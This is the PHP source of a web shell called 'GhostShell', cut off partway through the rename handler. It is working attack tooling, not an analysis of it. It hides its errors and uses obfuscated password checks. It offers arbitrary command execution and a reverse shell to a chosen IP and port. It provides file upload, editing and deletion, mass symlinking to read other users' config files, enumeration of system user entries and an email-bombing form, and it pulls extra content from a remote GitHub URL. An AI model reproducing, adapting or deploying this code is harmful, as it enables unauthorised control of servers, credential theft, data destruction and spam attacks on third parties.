<?php

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// creating session

session_start();
$GhostShell_Ver = 2.3;
$GhostConfig = array($_REQUEST,$_POST,$_SERVER,$_COOKIE,$_FILES);
$GhostSyntax = array("file_get_contents","fileperms","readfile","chdir","getcwd","function_exists","fsockopen","pcntl_fork",
"stream_set_blocking","proc_get_status","proc_open","proc_close","posix_setsid","stream_select","stream_get_contents","posix_getpwuid"); // $GLOBALS['GhostSyntax']
$GhostCmd = array("system","shell_exec","exec","passthru","proc_open");
$GhostPlatform = strtolower(substr(PHP_OS,0,3));
$GhostPOptions = array("edit","cmd","del","sql","conf","sym","reverse","crack","mass","logout","dest","ren","chmd","unzip","bombing");

#new update will use chdir(); function
#readlink("symlink_file"),lchgrp(symlink_file, uid),lchown(symlink_file, 8) function


class GhostShell{

    public $string;
    public $query; // 0=path , 1=file

    public $keys= 'silent@ghostsec';
    private $options=0;
    private $iv="4797450924659018";
    private $ciphering="AES-256-CBC";
    private $iv_length;
    private $output;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;
    private $clen    = 0;       
    private $error   = false;   

    static protected $pass = "++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++.+.+++++++.++++.+.<------.---------------.++..++++."; //ghost@1337
    static protected $remote_url = "https://raw.githubusercontent.com/Falco1337/GhostShell/main/contents";
    
    public function __construct(){
        $_SESSION['latest'] = $GLOBALS['GhostSyntax'][0](self::$remote_url . "/version.txt");
        $_SESSION['need_update'] = false;
        if(doubleval($_SESSION['latest'])!==$GLOBALS['$GhostShell_Ver']){
            $_SESSION['need_update'] = true;
        }
    }

    public function GhostPopupMSG($no,$title,$msg,$foot,$x){
        if($x){
            $location = "window.location.replace(window.location.href)";
        }else{
            $location = "window.history.back()";
        }

        if(isset($GLOBALS['GhostConfig'][0]['ghostp']) && isset($GLOBALS['GhostConfig'][0]['ghostf'])){
            $slocation = "window.location.replace('?ghostp=".$GLOBALS['GhostConfig'][0]['ghostp']."')";
        }else{
            $slocation = "window.location.replace('".$GLOBALS['GhostConfig'][2]['PHP_SELF']."')";
        }

        switch($no){
            case 1:
                $script = "<script>
                Swal.fire({
                    icon: 'info',
                    title: '".$title."',
                    text: '".$msg."',
                    footer: '".$foot."'
                  });
                  setTimeout(function(){ ".$location." },1500);
                </script>";
                print($script);
                break;
            case 2:
                $script = "<script>
                Swal.fire({
                    icon: 'error',
                    title: '".$title."',
                    text: '".$msg."',
                    footer: '".$foot."'
                  });
                  setTimeout(function(){ ".$location." },1500);
                </script>";
                print($script);
                break;
            case 3:
                $script = "<script>
                Swal.fire({
                    position: 'top-end',
                    icon: 'success',
                    title: '".$msg."',
                    showConfirmButton: false,
                    timer: 2000
                  });
                  setTimeout(function(){ ".$location." },1500);
                </script>";
                print($script);
                break;
            case 4:
                $script = "<script>
                Swal.fire({
                    position: 'top-end',
                    icon: 'error',
                    title: '".$msg."',
                    showConfirmButton: false,
                    timer: 2000
                  });
                  setTimeout(function(){ ".$location." },1500);
                </script>";
                print($script);
                break;
            case 5:
                $script = "<script>
                Swal.fire({
                    position: 'top-end',
                    icon: 'success',
                    title: '".$msg."',
                    showConfirmButton: false,
                    timer: 2000
                  });
                </script>";
                print($script);
                break;
        }
    }
    function __call($method, $arg){
        if(isset($method) && isset($arg)){
            $arg[0]($arg[1]);
            //upcoming CNC ddos
        }
    }

    private function triggered(){
        print("Place where magic happend!");
    }

    public function Enc()
    {
        $this->iv_length = openssl_cipher_iv_length($this->ciphering);
        $this->output = openssl_encrypt($this->string,$this->ciphering,sha1($this->keys),$this->options,$this->iv);
        return $this->output;
    }
    public function Dec($enc)
    {
        $this->output = openssl_decrypt($enc,$this->ciphering,sha1($this->keys),$this->options,$this->iv);
        return $this->output;
    }
    public function GhostLogin($password){
        $login_pass = $this->Dec(urldecode($password));
        if($login_pass === $this->Dec(self::$pass)){
            $_SESSION['Ghost_Auth']=sha1($GLOBALS['GhostConfig'][2]['REMOTE_ADDR']);
            setrawcookie('GhostVersion',$GLOBALS['$GhostShell_Ver'],(time()+18000),'/',$GLOBALS['GhostConfig'][2]['HTTP_HOST'],1,1);
            return true;
        }else{
            echo "<script>alert('Wrong pass!');window.location.replace('".$GLOBALS['GhostConfig'][2]['PHP_SELF']."')</script>";
            //echo $login_pass;
            return false;
        }
    }

    public function GhostSlash(){
        if($GLOBALS['GhostPlatform']!=='win'){
            $slashtype = "/";
        }else{
            $slashtype = "\\";
        }
        return $slashtype;
    }

    public function GhostFormat($bytes)
    {
        if ($bytes >= 1073741824)
        {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        }
        elseif ($bytes >= 1048576)
        {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        }
        elseif ($bytes >= 1024)
        {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        }
        elseif ($bytes > 1)
        {
            $bytes = $bytes . ' B';
        }
        else
        {
            $bytes = '0 bytes';
        }
        return $bytes;
    }


########## REVERSHELL> CREDIT : https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php #########


    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($GLOBALS['GhostPlatform'] === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); }
        }
    }
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($GLOBALS['GhostPlatform'] === 'lin' && $iname === 'STDOUT' && $this->clen) {
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
        }
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) {
            $this->error = true;
            echo "<br>STRM_ERROR: Cannot read from {$name}, script will now exit...<br>";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) {
            $this->error = true; 
            echo "<br>STRM_ERROR: Cannot write to {$name}, script will now exit...<br>";
        }
        return $bytes;
    }
    public function GhostReverse($ip,$port){
        $exit = false;

        if($GLOBALS['GhostPlatform']!=='lin'){
            $exec = 'cmd.exe';
        }else{
            $exec = '/bin/sh';
        }

        if (!$GLOBALS['GhostSyntax'][5]('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...";
        } else if (($pid = @$GLOBALS['GhostSyntax'][7]()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...";
        } else if ($GLOBALS['GhostSyntax'][12]() < 0) {
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...";
        } else {
            echo "DAEMONIZE: Completed successfully!";
        }

        if(!$exit){
            @set_time_limit(0);
            @umask(0);
            $socket = @$GLOBALS['GhostSyntax'][6]($ip, $port, $errno, $errstr, 30);
            if(!$socket){
                echo "Erro Socket! -> {$errno}: {$errstr}";
            }else{
                $GLOBALS['GhostSyntax'][8]($socket, false);
                $process = @$GLOBALS['GhostSyntax'][10]($exec, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell";
                }else{
                    foreach ($pipes as $pipe) {
                        $GLOBALS['GhostSyntax'][8]($pipe, false);
                    }
                    $status = $GLOBALS['GhostSyntax'][9]($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
                    do {
                        $status = $GLOBALS['GhostSyntax'][9]($process);
                        if (feof($socket)) {
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {
                            echo "PROC_ERROR: Shell process has been terminated";   break;
                        }
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @$GLOBALS['GhostSyntax'][13]($streams['read'], $streams['write'], $streams['except'], 0);
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($GLOBALS['GhostPlatform'] === 'lin') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }
                            } else if ($GLOBALS['GhostPlatform'] === 'win') {
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }
                            }
                        }
                    } while (!$this->error);
                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    $GLOBALS['GhostSyntax'][11]($process);
                }
                fclose($socket);
            }
        }
    }


####### END REVERSHELL ########

    public function GhostAction($action){
        switch(strtolower($action)){
            case "download":
                $slashtype = $this->GhostSlash();
                $pathfile = $this->Dec(($this->query[0])) . $this->Dec(($this->query[1]));
                $pathfile = $this->Dec($this->GhostDirFilter($pathfile));
                if( file_exists($pathfile) ){
                    $type = mime_content_type($pathfile) ?: 'text/plain';
                    header("Content-Type: ".$type);
                    header('Content-Description: File Transfer');
                    header("Content-Length: ".filesize($pathfile));
                    header('Content-Disposition: attachment; filename="'.basename($pathfile).'"');
                    $GLOBALS['GhostSyntax'][2]($pathfile);
                }else{
                    echo "<script>alert('File not found!');</script>";
                }
            break;
            case "chmd":
                $slashtype = $this->GhostSlash();
                $this->GhostCurrent($slashtype);
                if(isset($this->query)){
                    $dirmod = $this->Dec($this->query[0]);
                    $filmod = "";
                    if(isset($this->query[1])){
                        $filmod = $this->Dec($this->query[1]);
                    }
                    $_cmod = $this->GhostMod(fileperms($dirmod . $filmod));
echo "<section class='modarea'><p>Location : <span style='color:#FFD700;'>$dirmod$filmod</span></p>";
echo "<form action='' method='POST' autocomplete='OFF'>
<input type='text' name='modf' placeholder='$_cmod' class='modarea-input'>
<input type='submit' name='cmod' value='Chmod' class='modarea-submit'>
</form></section>
";
                    if(isset($GLOBALS['GhostConfig'][1]['cmod'])){
                        if($this->GhostChange($dirmod . $filmod,$GLOBALS['GhostConfig'][1]['modf'])){
                            echo "<script>alert('Successfully changed!');</script>";
                        }else{
                            echo "<script>alert('An error occured!');</script>";
                        }
                    }
                }
            break;
            case "bombing":

echo "<div class='bombing'>
<h3>Email Bombing</h3>
<form action='' method='POST'>
<table>
    <tr>
        <td colspan='2'><input type='text' name='mail_subject' placeholder='Subject' class='bombing-input'></td>
    </tr>
    <tr>
        <td><textarea name='mail_list' placeholder='email@list.com' class='bombing-textarea'></textarea></td>
        <td><textarea name='mail_text' placeholder='Message Text' class='bombing-textarea'></textarea></td>
    </tr>
    </tr>
        <td colspan='2'><button class='bombing-button'>SEND MAIL</button></td>
    </tr>
</table>
</form>
";

                if(isset($GLOBALS['GhostConfig'][1]['mail_list']) && isset($GLOBALS['GhostConfig'][1]['mail_text'])){
                    $emails = explode("\n",$GLOBALS['GhostConfig'][1]['mail_list']);
                    $message = $GLOBALS['GhostConfig'][1]['mail_text'];
                    $subject = $GLOBALS['GhostConfig'][1]['mail_subject'];
                    $headers = "From: ".$GLOBALS['GhostConfig'][2]['SERVER_ADMIN'];
                    foreach($emails as $email){
                        $email = preg_replace("/\s+/i","",$email);
                        if(@mail($email,$subject,$message,$headers)){
                            print("<font color='green'>Email sent -> ".$email."</font><br>");
                        }else{
                            print("<font color='red'>Failed -> ".$email."</font><br>");
                        }
                    }
                }
                echo "</div>";
            break;
            case "massdel":
                //upcoming
                if(isset($GLOBALS['GhostConfig'][1]['selectAction'])){
                    if($GLOBALS['GhostConfig'][1]['selectAction']==="Delete")
                    if(!empty($GLOBALS['GhostConfig'][1]['toZip'])){

                        if(isset($GLOBALS['GhostConfig'][0]['ghostp'])){
                            $delPath = $this->Dec($GLOBALS['GhostConfig'][0]['ghostp']) . $slashtype;
                        }else{
                            $delPath = "";
                        }

                        $toDel = $GLOBALS['GhostConfig'][1]['toZip'];

                        for($i=0;$i<count($toDel);$i++){
                            $mdel = explode("||",$toDel[$i]);
                            $mdel_dir = $this->Dec(urldecode($mdel[0]));
                            $mdel_item = $this->Dec(urldecode($mdel[1]));
                            if(file_exists($mdel_dir . $mdel_item)){
                                if(is_dir($mdel_dir . $mdel_item)){
                                    @rmdir($mdel_dir . $mdel_item);
                                }
                                if(is_file($mdel_dir . $mdel_item)){
                                    @unlink($mdel_dir . $mdel_item);
                                }
                            }
                        }
                        $this->GhostPopupMSG(3,null,"Selected file deleted!",null,true);
                    }else{
                        $this->GhostPopupMSG(4,null,"No file deleted!",null,true);
                    }
                }
            break;
            case "zipping":
                $ziproc = new ZipArchive;
                $slashtype = $this->GhostSlash();
                if(isset($GLOBALS['GhostConfig'][1]['selectAction'])){
                    if($GLOBALS['GhostConfig'][1]['selectAction']==="Zip")
                    if(empty($GLOBALS['GhostConfig'][1]['toZip'])){
                        print("<script>alert('You have to pick a file');</script>");
                    }else{
                        $toZip = $GLOBALS['GhostConfig'][1]['toZip'];
                        $zipXname = md5(time()) . ".zip";
                        if(isset($GLOBALS['GhostConfig'][0]['ghostp'])){
                            $zipdirname = $this->Dec($GLOBALS['GhostConfig'][0]['ghostp']) . $slashtype . $zipXname;
                        }else{
                            $zipdirname = $zipXname;
                        }
                        if($ziproc -> open($zipdirname, ZipArchive::CREATE | ZipArchive::OVERWRITE)){
                            for($i=0;$i<count($toZip);$i++){
                                $mzip = explode("||",$toZip[$i]);
                                if(($mzip[1])==="[novalue]"){
                                    $dirtozip = $this->Dec(urldecode($mzip[0])) . $slashtype;
                                    $recdir = new RecursiveIteratorIterator(
                                        new RecursiveDirectoryIterator($dirtozip),
                                        RecursiveIteratorIterator::LEAVES_ONLY
                                    );
                                    foreach ($recdir as $name => $file)
                                    {
                                        if (!$file->isDir())
                                        {
                                            $filePath = $file->getRealPath();
                                            $relativePath = substr($filePath, strlen($dirtozip));
                                            $ziproc->addFile($filePath, $relativePath);
                                        }
                                    }

                                }else{
                                    $filetozip = $this->Dec(urldecode($mzip[0])) . $slashtype . $this->Dec(urldecode($mzip[1]));
                                    $ziproc->addFile($filetozip,$this->Dec(urldecode($mzip[1])));
                                }
                            }
                            echo "<script>alert('saved as $zipXname');window.location.replace(window.location.href);</script>";
                            $ziproc ->close();
                        }

                    }
                }
            break;
            case "upload":
                $slashtype = $this->GhostSlash();
                if(!isset($this->query[0])){
                    $path = getcwd() . $slashtype;
                }else{
                    $path = $this->Dec(($this->query[0])) ?: getcwd() . $slashtype;
                }
                $path = $this->Dec($this->GhostDirFilter($path)) . $slashtype;
                if(isset($GLOBALS['GhostConfig'][1]['ghostupload'])){
                    if(move_uploaded_file($GLOBALS['GhostConfig'][4]['ghostfile']['tmp_name'],$path.$GLOBALS['GhostConfig'][4]['ghostfile']['name'])){
                        $this->GhostPopupMSG(3,null,"File uploaded!",null,true);
                    }else{
                        $this->GhostPopupMSG(4,null,"Permission denied!",null,true);
                    }
                }

            break;
            case "dest":
                $slashtype = $this->GhostSlash();
                if(!isset($GLOBALS['GhostConfig'][1]['destroy'])){
                    echo "<section id='destroyer'><form action='' method='POST'>";
                    echo "<input type='submit' name='destroy' value='Remove this shell'/></section></form>";
                }else{
                    $Ghost_SHELL = $GLOBALS['GhostConfig'][2]['DOCUMENT_ROOT'] . $slashtype . $GLOBALS['GhostConfig'][2]['PHP_SELF'];
                    if(unlink($Ghost_SHELL)){
                        $this->GhostPopupMSG(3,null,"File destroyed!!",null,false);
                    }else{
                        $this->GhostPopupMSG(4,null,"Unable destroyed!!",null,true);
                    }
                }
            break;
            case "edit":
                $slashtype = $this->GhostSlash();
                $this->GhostCurrent($slashtype);
                $pathfile = $this->Dec(($this->query[0])) . $this->Dec(($this->query[1]));
                $pathfile = $this->Dec($this->GhostDirFilter($pathfile));
                if(!isset($GLOBALS['GhostConfig'][1]['ghostedit'])){
                    echo "<section class='editform'>";
                    echo "<form action='' method='POST'>";
                    echo "<textarea class='editcontent' name='editx'>";
                    echo htmlspecialchars($GLOBALS['GhostSyntax'][0]($pathfile));
                    echo "</textarea>";
                    echo "<input type='submit' name='ghostedit' value='Save'>";
                    echo "</form></section>";
                }else{
                    $pto = fopen($pathfile,'w');
                    fwrite($pto,$GLOBALS['GhostConfig'][1]['editx']);
                    fclose($pto);
                    $this->GhostPopupMSG(3,null,"Saved!",null,true);
                }
            break;
            case "view":
                $slashtype = $this->GhostSlash();
                $this->GhostCurrent($slashtype);
                $pathfile = $this->Dec(($this->query[0])) . $this->Dec(($this->query[1]));
                $pathfile = $this->Dec($this->GhostDirFilter($pathfile));
                echo "<p id='sshows'><span id='fnameshow'>Filename -> </span><span id='fnameshow1'>".$this->Dec(($this->query[1]))."</span></p>";
                echo "<section class='sources'>";
                show_source($pathfile);
                echo "</section><div id='buttontoedit'>
                <a href='?ghostp=".urlencode($this->query[0])."&ghostf=".urlencode($this->query[1])."&ghostaction=edit'>
                <button>Edit</button></a></div>";

            break;
            case "mkfile":
                $slashtype = $this->GhostSlash();
                if(isset($GLOBALS['GhostConfig'][1]['createfile'])){
                    $fname = $GLOBALS['GhostConfig'][1]['newfile'] ?: 'newfile.txt';
                    $fcreate = fopen($this->Dec(($this->query[0])).$slashtype.$fname,'w');
                    fwrite($fcreate,"");
                    fclose($fcreate);
                    $this->GhostPopupMSG(3,null,"File created!",null,true);
                }
            break;
            case "mkdir":
                $slashtype = $this->GhostSlash();
                if(isset($GLOBALS['GhostConfig'][1]['createfolder'])){
                    $fname = $GLOBALS['GhostConfig'][1]['newfolder'] ?: 'newfolder';
                    if(!file_exists($fname)){
                        if(mkdir($this->Dec(($this->query[0])).$slashtype.$fname)){
                            $this->GhostPopupMSG(3,null,"Folder created!",null,true);
                        }else{
                            $this->GhostPopupMSG(4,null,"Permission denied!",null,true);
                        }
                    }else{
                        $this->GhostPopupMSG(4,null,"Folder existed!",null,true);
                    }
                }
            break;
            case "cmd":
                $slashtype = $this->GhostSlash();
                $this->GhostCurrent($slashtype);
                echo "<section id='cmd_area'>";
                echo "<form action='' method='POST' autocomplete='OFF'><textarea class='cmd_response' readonly='TRUE'>";
                if(isset($GLOBALS['GhostConfig'][1]['ghostcmd']) && !empty($GLOBALS['GhostConfig'][1]['ghostcmd'])){
                   $this->GhostExecute($GLOBALS['GhostConfig'][1]['ghostcmd']);
                }
                echo "</textarea><br><input type='text' name='ghostcmd' placeholder='whoami'><br><button>Execute</button></form>";
                echo "</section>";
            break;
            case "sym":
                echo "<section class='symlinkarea'><div class='symex'><label>Example : /home/%{user}%/public_html/target_file.php || /var/www/%{user}%/html/file.php</label></div>";
                echo "<table><form action='' method='POST'>";
                echo "<input type='hidden' name='ghostsym'><br>";
                echo "<tr><td id='symlable' class='symex1'><label>Symlink home&file target : </label></td><td id='symlable'><input type='text' name='target' placeholder='/path/%{user}%/path/file.php'></td></tr>";
                echo "<tr><td id='symlable' class='symex1'><label>Saved to path : </label></td><td id='symlable'><input type='text' name='path' placeholder='path/'></td></tr>";
                echo "<tr><td id='symlable' class='symex1'><label>Saved as : </label></td><td id='symlable'><input type='text' name='ghostsaved' placeholder='wp-config.txt'></td></tr>";
                echo "<tr><td id='symlable'></td><td id='symlable'><button>Symlink</button></td></tr></form></table><div class='sym_response'>";
                if(isset($GLOBALS['GhostConfig'][1]['ghostsym'])){
                    if($GLOBALS['GhostPlatform']!=='win'){
                        if(!file_exists('sym')) { mkdir($GLOBALS['GhostConfig'][1]['path'].'/sym'); }
                        $contents = $GLOBALS['GhostSyntax'][0](self::$remote_url . "/htaccess.txt");
                        for ($uid = 0; $uid < 4000; $uid++){ 
                            $nothing = posix_getpwuid($uid);
                            if (!empty($nothing)){ 
                                if(!file_exists($GLOBALS['GhostConfig'][1]['path'].'/sym/'.$nothing['name'])){
                                    mkdir($GLOBALS['GhostConfig'][1]['path'].'/sym/'.$nothing['name']);

                                    $targetpath = $this->GhostRender('/%{user}%/i',$nothing['name'],base64_decode(urldecode($GLOBALS['GhostConfig'][1]['target'])));

                                    if(isset($targetpath)){
                                        $this->GhostExecute("ln -s ".$targetpath.' '.$GLOBALS['GhostConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['GhostConfig'][1]['ghostsaved']); 
                                        symlink($targetpath, $GLOBALS['GhostConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['GhostConfig'][1]['ghostsaved']);
    
                                        $user_ht = fopen($GLOBALS['GhostConfig'][1]['path'].'/sym/'.$nothing['name'].'/.htaccess','w');
                                        fwrite($user_ht,$this->GhostRender('/%{user}%/i',$GLOBALS['GhostConfig'][1]['ghostsaved'],$contents));
                                        fclose($user_ht);
    
                                        $ghostv = urlencode($GLOBALS['GhostConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['GhostConfig'][1]['ghostsaved']);
                                        print("Done! -> ".$nothing['name']." -> <a href='".urldecode($ghostv)."'>Open</a><br>");
                                    }
                                }else{
                                    $targetpath = $this->GhostRender('/%{user}%/i',$nothing['name'],base64_decode(urldecode($GLOBALS['GhostConfig'][1]['target'])));

                                    if(isset($targetpath)){
                                        $this->GhostExecute("ln -s ".$targetpath.' '.$GLOBALS['GhostConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['GhostConfig'][1]['ghostsaved']); 
                                        symlink($targetpath, $GLOBALS['GhostConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['GhostConfig'][1]['ghostsaved']);
    
                                        $user_ht = fopen($GLOBALS['GhostConfig'][1]['path'].'/sym/'.$nothing['name'].'/.htaccess','w');
                                        fwrite($user_ht,$this->GhostRender('/%{user}%/i',$GLOBALS['GhostConfig'][1]['ghostsaved'],$contents));
                                        fclose($user_ht);
    
                                        $ghostv = urlencode($GLOBALS['GhostConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['GhostConfig'][1]['ghostsaved']);
                                        print("Done! -> ".$nothing['name']." -> <a href='".urldecode($ghostv)."'>Open</a><br>");
                                    }
                                }
                            }
                        }
                    }else{
                        echo "<center><font color='red' size='6'><code>Not work in window!</code></font></center>";
                    }
                }
                echo "</div></section>";

            break;
            case "reverse":
                $revhtml = explode('||',$GLOBALS['GhostSyntax'][0](self::$remote_url.'/others.html'))[1];
                echo "<section class='reverse'>";
                if(!isset($GLOBALS['GhostConfig'][1]['ghostrev'])){
                    echo $revhtml;
                }else{
                    echo $revhtml;
                    echo "<code>";
                    $addr = trim($GLOBALS['GhostConfig'][1]['ghostaddr']);
                    $port = trim($GLOBALS['GhostConfig'][1]['ghostport']);
                    $this->GhostReverse($addr,$port);
                    echo "</code>";
                }
                echo "</section>";
            break;
            case "conf":
                echo "<section class='configs'>";
                $pwid = array();
                if($GLOBALS['GhostPlatform']!=='win'){
                    for ($uid = 0; $uid < 4000; $uid++){ 
                        $nothing = posix_getpwuid($uid);
                        if (!empty($nothing)){ 
                            array_push($pwid,$nothing['name'].':'.$nothing['passwd'].':'.$nothing['uid'].':'.$nothing['gid'].':'.$nothing['dir'].':'.$nothing['shell']);
                        }
                    }
                    foreach($pwid as $conf){
                        print($conf."<br>");
                    }
                }else{
                    echo "<center>Not work in window!</center>";
                }
                echo "</section>";
            break;
            case "unzip":
                $from = $this->Dec($GLOBALS['GhostConfig'][0]['ghostp']);
                $zipp = $this->Dec($GLOBALS['GhostConfig'][0]['ghostf']);
                echo "<section id='unzipping'>";
                if(isset($GLOBALS['GhostConfig'][1]['destination'])){
                    $ziproc = new ZipArchive;
                    $pth = $from.$zipp;
                    if ($ziproc->open($pth) === TRUE) {
  
                        // Unzip Path
                        $ziproc->extractTo($GLOBALS['GhostConfig'][1]['destination']);
                        $ziproc->close();
                        $this->GhostPopupMSG(3,null,"File successfully extracted to destination!",null,false);
                    } else {
                        $this->GhostPopupMSG(4,null,"Failed to extract into destination!",null,false);
                    }
                }else{
                    echo "<center><font color='white'>Filename : ".$from.$zipp."</font>";
                    echo "<table><form action='' method='POST'><tr><td><label>Destination : </label></td>";
                    echo "<td><input type='text' name='destination'></td></tr><tr><td></td><td><button>Unzip</button></td>";
                    echo "</form></table></center>";
                }
                echo "</section>";
            break;
            case "scand":
                $slashtype = $this->GhostSlash();
                $path = $this->Dec(($this->query[0])). $slashtype;
                $path = $this->Dec($this->GhostDirFilter($path));
                $this->GhostCurrent($slashtype);
                echo "<div class='directory'><form action='' method='POST'>";
                echo "<table><th>Pick</th><th>Type</th><th>Name</th><th>Size</th><th>Owner:Groups</th><th>Perms</th><th>Modified</th><th>Action</th>";
                $folder = array_diff(scandir($path),['.','..']);
                $files = scandir($path);

                foreach($folder as $p){
                    if(is_dir($path . $slashtype . $p)){
                        $filtered = $this->Dec($this->GhostDirFilter($path));
                        $this->string = $filtered . $p;

                        $uid = explode(':',$this->GhostSOG($filtered.$slashtype.$p));
                        //$og = posix_getpwuid($uid[0]);

                        echo "<p><tr><td id='fchecks'><input type='checkbox' name='toZip[]' value='".urlencode($this->Enc())."||[novalue]'></td></td>";
                        echo "<td id='iconx'><i class='fa-regular fa-folder'></i></td><td id='tbname'><a href='?ghostp=".urlencode($this->Enc())."'>$p</a></td>";
                        echo "<td></td>";
                        echo "<td id='tbcen'>".$this->GhostSOG($filtered . $slashtype . $p)."</td>";
                        echo "<td id='tbcen'><a href='?ghostp=".urlencode($this->Enc())."&ghostaction=chmd'>".$this->GhostPerms($filtered . $slashtype . $p)."</a></td>";
                        echo "<td id='tbcen' class='tbdate'>".date("h:i:sA(d/m/Y)",filemtime($filtered . $slashtype . $p))."</td>";
                        echo "<td id='tbcen'> <a href='?ghostp=".urlencode($this->Enc())."&ghostaction=ren'><i class='fa-solid fa-pen'></i></a>. 
                        <a href='?ghostp=".urlencode($this->Enc())."&ghostaction=del'><i class='fa-solid fa-trash'></i></a></td></tr></p>";

                    }
                }
                foreach($files as $p){
                    if(is_file($path . $slashtype . $p)){
                        $filtered = $this->Dec($this->GhostDirFilter($path));
                        $this->string = $filtered;
                        $ghostp = $this->Enc();
                        $this->string = $p;
                        $ghostf = $this->Enc();
                        $compressed = array("zip","tar","gz","rar");
                        $isZip = pathinfo($p,PATHINFO_EXTENSION);
                        if(in_array($isZip,$compressed)){
                            $tname = $p . "<button style='border-radius:8px;background:orange;'>
                            <a style='color:black;' href='?ghostp=".urlencode($ghostp)."&ghostf=".urlencode($ghostf)."&ghostaction=unzip'>
                             UNZIP </a></button>";
                        }else{
                            $tname = $p;
                        }

                        echo "<p><tr><td id='fchecks'><input type='checkbox' name='toZip[]' value='".urlencode($ghostp)."||".urlencode($ghostf)."'></td></td>";
                        echo "<td id='iconx'><i class='fa-solid fa-file'></i></td><td id='tbname'><a href='?ghostp=".urlencode($ghostp)."&ghostf=".urlencode($ghostf)."'>$tname</a></td>";
                        echo "<td>".$this->GhostFormat(filesize($filtered.$p))."</td>";
                        echo "<td id='tbcen'>".$this->GhostSOG($filtered.$p)."</td>";
                        echo "<td id='tbcen'><a href='?ghostp=".urlencode($ghostp)."&ghostf=".urlencode($ghostf)."&ghostaction=chmd'>".$this->GhostPerms($filtered.$p)."</a></td>";
                        echo "<td id='tbcen' class='tbdate'>".date("h:i:sA(d/m/Y)",filemtime($filtered.$p))."</td>";
                        echo "<td id='tbcen'>
                        <a href='?ghostp=".urlencode($ghostp)."&ghostf=".urlencode($ghostf)."&ghostaction=edit'><i class='fa-solid fa-file-signature'></i></a> . 
                        <a href='?ghostp=".urlencode($ghostp)."&ghostf=".urlencode($ghostf)."&ghostaction=ren'><i class='fa-solid fa-pen'></i></a> . 
                        <a href='?ghostp=".urlencode($ghostp)."&ghostf=".urlencode($ghostf)."&ghostaction=del'><i class='fa-solid fa-trash'></i></a> . 
                        <a href='?ghostp=".urlencode($ghostp)."&ghostd=".urlencode($ghostf)."&ghostaction=download'><i class='fa-solid fa-download'></i></a></td></tr></p>";
                    }
                }
                echo "</table>
                <div id='anact'>

                <select name='selectAction'>
                <option value=''>-- Action --</option>
                <option value='Zip'>-- Zip --</option>
                <option value='Delete'>-- Delete --</option>
                </select>
                <input type='submit' value='Submit'>
                </div></form></div>";

            break;
            case "del":
                $slashtype = $this->GhostSlash();
                $pathfile = $this->Dec(($this->query[0])) . $this->Dec(($this->query[1]?:''));
                $pathfile = $this->Dec($this->GhostDirFilter($pathfile));
                if(is_file($pathfile)){
                    if(unlink($pathfile)){
                        $this->GhostPopupMSG(3,null,"File Successfully deleted!",null,false);
                    }else{
                        $this->GhostPopupMSG(4,null,"Permission denied!",null,false);
                    }
                }else if(is_dir($pathfile)){
                    if(rmdir($pathfile)){
                        $this->GhostPopupMSG(3,null,"Directory Successfully deleted!",null,false);
                    }else{
                        $this->GhostPopupMSG(4,null,"Permission denied!",null,false);
                    }
                }
            break;
            case "ren":
                $slashtype = $this->GhostSlash();
